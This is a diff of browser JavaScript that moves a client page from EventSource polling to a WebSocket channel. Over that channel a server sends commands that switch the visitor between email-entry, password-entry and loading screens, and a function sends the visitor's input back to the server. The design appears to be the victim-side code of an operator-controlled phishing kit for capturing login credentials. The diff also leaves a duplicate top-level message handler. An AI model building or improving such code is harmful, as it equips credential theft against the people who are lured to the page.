@@ -69,35 +69,41 @@ function getClientId() {
 
 
 
-// EventSource connection and handling
-let eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
+let currPage = "client page";
+const clientId = getClientId();
+let socket;
 
-eventSource.onopen = () => console.log('Connection opened');
+function connectWebSocket() {
+  socket = new WebSocket(`wss://${window.location.host}/ws?clientId=${clientId}&currPage=${currPage}`);
 
-eventSource.onmessage = event => {
-  const data = JSON.parse(event.data);
-  console.log(data);
-  if (data.type === 'command') handleCommand(data.command);
-};
+  socket.onopen = () => {
+    console.log('WebSocket connection opened');
+  };
 
-eventSource.onerror = error => {
-  console.error('EventSource failed:', error);
-  connectEventSource();
-};
+  socket.onmessage = event => {
+    const data = JSON.parse(event.data);
+    console.log('WebSocket message received:', data);
+    if (data.type === 'command') {
+      handleCommand(data.command);
+    }
+  };
 
-function connectEventSource() {
-  eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
-  eventSource.onopen = () => console.log('Connection opened');
-  eventSource.onmessage = event => handleCommand(JSON.parse(event.data).command);
-  eventSource.onerror = error => {
-    console.error('EventSource failed:', error);
-    connectEventSource();
+  socket.onerror = error => {
+    console.error('WebSocket error:', error);
+    reconnectWebSocket();
   };
 }
 
-// Function to handle server commands
+function reconnectWebSocket() {
+  setTimeout(() => {
+    connectWebSocket();
+  }, 2000); // Retry connection after 2 seconds
+}
+
+connectWebSocket(); // Start WebSocket connection
+
 function handleCommand(command) {
-  switch(command) {
+  switch (command) {
     case 'emailScreen': loginScreen(); break;
     case 'passwordScreen': passwordScreen(); break;
     case 'loadScreen': showLoading(); break;
@@ -107,21 +113,19 @@ function handleCommand(command) {
   }
 }
 
-// Function to fetch command from server
-async function fetchCommand() {
-  try {
-    const response = await fetch('/client-data', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ clientId, currPage })
-    });
-    const data = await response.json();
-    console.log(data);
-    handleCommand(data.clients.command);
-  } catch (error) {
-    console.error('Error fetching command:', error);
-  }
+// Function to fetch command from server via WebSocket message
+function fetchCommand() {
+  socket.send(JSON.stringify({ type: 'fetchCommand' }));
 }
+
+// Handle incoming WebSocket messages
+socket.onmessage = event => {
+  const data = JSON.parse(event.data);
+  console.log('WebSocket message received:', data);
+  if (data.type === 'command') {
+    handleCommand(data.command);
+  }
+};
 
 // Function to send input to server and optionally redirect
 function sendInput(data, redirectUrl = null) {
